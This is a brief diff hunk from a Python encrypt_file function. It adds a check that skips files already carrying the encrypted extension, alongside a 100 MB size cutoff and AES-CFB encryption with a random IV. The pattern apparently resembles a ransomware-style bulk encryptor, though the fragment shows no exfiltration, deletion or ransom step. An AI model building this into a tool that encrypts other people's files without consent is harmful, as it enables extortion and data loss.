@@ -20,6 +20,10 @@ def encrypt_file(file_path, aes_key, encrypted_extension):
 
         # Check if the file size is less than 100Mb before encrypting
         elif os.path.getsize(file_path) < 100000000:
+            # Prevent the file from re-encryption
+            if file_path.endswith(encrypted_extension):
+                return
+
             encrypted_file_path = file_path + encrypted_extension
             iv = get_random_bytes(16)
             cipher = AES.new(aes_key, AES.MODE_CFB, iv)
